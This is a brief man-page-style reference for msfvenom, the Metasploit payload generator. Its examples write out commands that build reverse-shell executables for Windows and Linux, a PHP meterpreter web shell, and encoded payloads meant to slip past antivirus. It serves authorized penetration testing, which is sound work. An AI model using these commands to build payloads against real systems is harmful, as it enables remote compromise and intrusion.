# TLDR

**List payloads**

```msfvenom -l payloads```

**List encoders**

```msfvenom -l encoders```

**Generate Windows reverse shell**

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=[192.168.1.10] LPORT=[4444] -f exe > [shell.exe]```

**Generate Linux payload**

```msfvenom -p linux/x86/shell_reverse_tcp LHOST=[192.168.1.10] LPORT=[4444] -f elf > [shell.elf]```

**Encode payload**

```msfvenom -p [payload] -e x86/shikata_ga_nai -i [5] -f exe > [encoded.exe]```

**Generate shellcode**

```msfvenom -p [payload] -f c```

**Generate web payload**

```msfvenom -p php/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f raw > [shell.php]```

# SYNOPSIS

**msfvenom** [_options_]

# PARAMETERS

**-p** _PAYLOAD_
> Payload to use.

**-f** _FORMAT_
> Output format.

**-e** _ENCODER_
> Encoder to use.

**-i** _COUNT_
> Encoding iterations.

**-l** _TYPE_
> List available items.

**LHOST**
> Local host address.

**LPORT**
> Local port number.

**--help**
> Display help information.

# DESCRIPTION

**msfvenom** generates payloads for Metasploit. It combines msfpayload and msfencode functionality.

The tool creates shellcode and executables. Supports encoding and format conversion.

msfvenom is Metasploit payload generator.

# CAVEATS

Authorized testing only. AV may detect payloads. Part of Metasploit Framework.

# HISTORY

msfvenom replaced **msfpayload and msfencode** in Metasploit Framework, unifying payload generation.

# SEE ALSO

[msfconsole](/man/msfconsole)(1), [msfpc](/man/msfpc)(1), [nmap](/man/nmap)(1)

